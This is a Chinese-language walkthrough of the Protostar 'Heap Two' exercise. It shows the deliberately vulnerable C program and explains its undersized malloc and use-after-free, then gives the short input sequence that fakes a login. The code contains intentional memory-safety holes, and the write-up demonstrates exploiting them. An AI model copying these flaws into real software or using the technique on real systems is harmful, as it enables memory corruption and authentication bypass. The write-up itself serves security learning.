```
Heap Two

This level examines what can happen when heap pointers are stale.

This level is completed when you see the “you have logged in already!” message

This level is at /opt/protostar/bin/heap2
```
---
```c
// 引入标准库头文件
#include <stdlib.h>  // 提供内存分配（malloc、free）和字符串复制（strdup）等函数
#include <unistd.h>  // 提供 POSIX 操作系统 API 的类型和函数声明
#include <string.h>  // 提供字符串操作函数，如 strlen、strcpy、memset、strncmp
#include <sys/types.h> // 定义系统相关的数据类型，如 size_t
#include <stdio.h>   // 提供标准输入输出函数，如 printf、fgets

// 定义一个名为 auth 的结构体类型
struct auth {
    char name[32];   // 用于存储一个最多 31 个字符的用户名（第 32 字节为字符串结束符 '\0'）
    int auth;        // 一个整数（4 字节（通常）），用作认证状态标志（值为 0 表示未认证，非 0 表示已认证）
};

// 声明一个全局指针变量 auth，类型为 struct auth*
// 该指针用于指向一个动态分配的 struct auth 实例
struct auth *auth;

// 声明一个全局字符指针变量 service
// 该指针用于指向一个动态分配的字符串，表示服务名称
char *service;

int main(int argc, char **argv)
{
    // 定义一个字符数组 line，大小为 128 字节
    // 用于临时存储从标准输入读取的一行命令
    char line[128];

    // 进入无限循环，持续接收并处理用户输入
    while(1) {
        // 打印当前 auth 指针和 service 指针的内存地址
        // %p 格式符用于以十六进制形式输出指针地址
        printf("[ auth = %p, service = %p ]\n", (void*)auth, (void*)service);

        // 从标准输入（stdin）读取一行文本，最多读取 sizeof(line) - 1 = 127 个字符
        // 读取结果存入 line 数组，末尾自动添加 '\0'
        // 如果遇到文件结束（EOF）或读取错误，fgets 返回 NULL，此时退出循环
        if(fgets(line, sizeof(line), stdin) == NULL) 
            break;

        // 检查用户输入是否以字符串 "auth " 开头（前 5 个字符为 'a','u','t','h',' '）
        if(strncmp(line, "auth ", 5) == 0) {
            // 调用 malloc 分配一块大小为 sizeof(auth) 的内存
            // sizeof(auth) 计算的是指针 auth 的大小（通常为 8 字节）
            // 将分配的内存地址赋值给全局指针 auth
            auth = malloc(sizeof(auth));

            // 使用 memset 将刚分配的内存区域的前 sizeof(auth) 字节设置为 0
            memset(auth, 0, sizeof(auth));

            // 计算从 line 第 6 个字符开始（即跳过 "auth "）的子字符串长度
            // 如果该长度小于 31，则执行拷贝
            if(strlen(line + 5) < 31) {
                // 将 line 中 "auth " 之后的内容（即用户名）复制到 auth->name 数组中
                strcpy(auth->name, line + 5);
            }
        }

        // 检查用户输入是否以 "reset" 开头（前 5 个字符匹配）
        if(strncmp(line, "reset", 5) == 0) {
            // 调用 free 释放 auth 指针当前指向的内存块
            free(auth);
        }

        // 检查用户输入是否以 "service" 的前 6 个字符开头（即 "servic"）
        if(strncmp(line, "service", 6) == 0) {
            // 调用 strdup 复制从 line 第 8 个字符开始的字符串（跳过 "service" 和其后的空格）
            // strdup 内部会分配新内存并复制字符串，返回新内存的地址
            // 将该地址赋值给全局指针 service
            service = strdup(line + 7);
        }

        // 检查用户输入是否以 "login" 开头（前 5 个字符匹配）
        if(strncmp(line, "login", 5) == 0) {
            // 访问 auth 指针所指向结构体中的 auth 成员
            // 如果该成员的值非零，则打印已登录提示
            if(auth->auth) {
                printf("you have logged in already!\n");
            } else {
                // 否则提示用户输入密码
                printf("please enter your password\n");
            }
        }
    }

    // 主函数正常结束（仅在 fgets 返回 NULL 时到达此处）
    return 0;
}
```
---

**题目分析：**
```c
auth = malloc(sizeof(auth));        // sizeof(auth) = 8（指针大小）
strcpy(auth->name, line + 5);       // auth->name 是结构体前 32 字节

- `auth` 是 `struct auth*` 类型的**指针**，所以 `sizeof(auth) == 8`（64 位系统）。
- 但 `struct auth` 实际大小是 32（name） + 4（auth） = 36 字节（通常对齐到 40）。
- 只分配了 8 字节，却写入至少 32 字节（name）** → 写入超出分配区域，覆盖后续堆块内容。
- 导致可以溢出覆盖相邻堆块的 metadata 或其他变量（如 `service` 指针）
```

```c
free(auth);  // 释放内存
// 但 auth 指针未置 NULL
if(auth->auth) ... // 后续仍可访问已释放内存

- `reset` 后 `auth` 仍是原地址，但内存已归还给堆管理器。
- 若之后执行 `login`，会读取已释放内存中的 `auth` 字段 → **UAF**。
- 若此时该内存被 `service = strdup(...)` 重新分配，`auth->auth` 实际读的是 `service` 字符串的内容！
```

**本题目程序本身没有后门函数，但题目的设计就是：只要能让程序输出 "you have logged in already!"，就算破解成功**

```c
auth = malloc(sizeof(auth)); 
`sizeof(指针)` = **指针本身的大小**，不是它指向的东西的大小
- 在 32 位系统：指针 = 4 字节
- 在 64 位系统（如你的 Kali）：指针 = **8 字节**

所以，在这一步中，`sizeof(auth)` = **8**，因为 `auth` 是指针

auth = malloc(sizeof(auth));   
等价于  
auth = malloc(8);  // 只申请了 8 字节内存！

但是，题目实际要存的是`struct auth`，需要 **36 字节**，

所以在后面执行strcpy(auth->name, line + 5); 时，`auth->name` 是结构体的前 32 字节，但实际只分配了 8 字节

前 8 字节是合法内存
第 9~32 字节：写入未分配的内存 → 溢出
```

---

**解题：**
```c
└─$ ./heap2 
[ auth = (nil), service = (nil) ]
auth a
[ auth = 0x9fab818, service = (nil) ]
service asasasasassassaasasasasasasasasasasasasasasasasas
[ auth = 0x9fab818, service = 0x9fab828 ]
login
you have logged in already!
[ auth = 0x9fab818, service = 0x9fab828 ]
```

```c
在输出auth a后，程序执行如下操作：

auth = malloc(8);               // 只拿 8 字节
memset(auth, 0, 8);             // 只清前 8 字节
strcpy(auth->name, "a\n");      // 写入 "a\n\0" 到 name，但 name 需要 32 字节

其中， `"a\n"` 占 3 字节（'a', '\n', '\0'）
但 `strcpy` 会把整个字符串写进去，而 `auth->name` 的空间实际只有前 8 字节是合法的
后面 24 字节写入的是不属于auth的内存 → 堆溢出

接着继续输入 `service 一大长串字符`，和auth的内存紧挨着，于是 `auth->auth`（偏移32）正好落在 `service` 的字符串内容里，读到非零值 → 登录成功 
```

```c
实际如下：

`auth` 结构体在定义上需要 36 字节空间（前 32 字节是 `name`，后 4 字节是 `auth` 用于判断是否登录）
但程序实际只分配了 8 字节（因为 `sizeof(auth)` 计算的是指针大小，而非结构体大小）。  

程序错误地认为：“从 `auth` 指针开始的 36 字节都是我的”，所以它会去读 `auth + 32` 的位置**。  

然而，`malloc` 仅返回了 8 字节合法内存，`auth + 32` 所在的地址根本**不属于 `auth` 的分配区域**，而是堆上的其他内存。  

接着，当执行 `service` 命令并输入一长串字符串时，`strdup` 分配的新内存块可能紧邻 `auth` 的内存区域，其字符串内容会填充到后续地址。  

如果该字符串足够长，其内容就会覆盖到 `auth->auth` 所在的地址（即 `auth` 指针 + 32 的位置）。  

由于字符串内容（如 `'a'`、`'s'`）的 ASCII 值非零，`auth->auth` 被读作非零值，从而触发 `login` 成功，输出 `"you have logged in already!\n"`。
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250927173728580.png)
